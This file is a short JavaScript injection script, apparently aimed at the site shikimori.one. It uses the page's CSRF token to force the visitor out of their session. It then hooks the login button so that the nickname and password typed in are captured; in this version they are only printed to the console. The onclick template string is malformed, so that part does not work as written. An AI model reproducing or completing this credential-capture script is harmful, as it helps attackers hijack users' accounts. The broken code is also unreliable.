 function injectCode() {
    console.log('Init Inject');
    signOutUser();
    const submitButton = document.querySelector('.btn-primary');
    if(submitButton != null) {
        console.log('button found!');
        const name = document.getElementById('user_nickname');
        const pass = document.getElementById('user_password');
        if(pass != null && name != null) {
            console.log('inputs found!');
            submitButton.setAttribute("onclick","console.log(name: ${name.value}, pass : ${pass.value});");
        }
    }
 }

 function signOutUser() {
     const xhr = new XMLHttpRequest();
        xhr.open("GET", "https://shikimori.one/", true);
        xhr.send();
        xhr.onload = function() {
            if (xhr.status === 200) {
                const bodyDoc = document.querySelector('body');
                const jsonAttribute = bodyDoc.getAttribute('data-user');
                const jsonObject = JSON.parse(jsonAttribute);
                const parser = new DOMParser();
                const doc = parser.parseFromString(xhr.responseText, "text/html");
                const metaTag = doc.querySelector('meta[name="csrf-token"]');
                const csrfToken = metaTag ? metaTag.getAttribute("content") : null;
                            const xhr2 = new XMLHttpRequest();
                            xhr2.open("POST", "/api/users/sign_out", true);
                            xhr2.setRequestHeader("Content-Type", "application/json");
                            xhr2.setRequestHeader("X-CSRF-Token", csrfToken);
                            xhr2.send()
                        }
        }
 }

 injectCode();
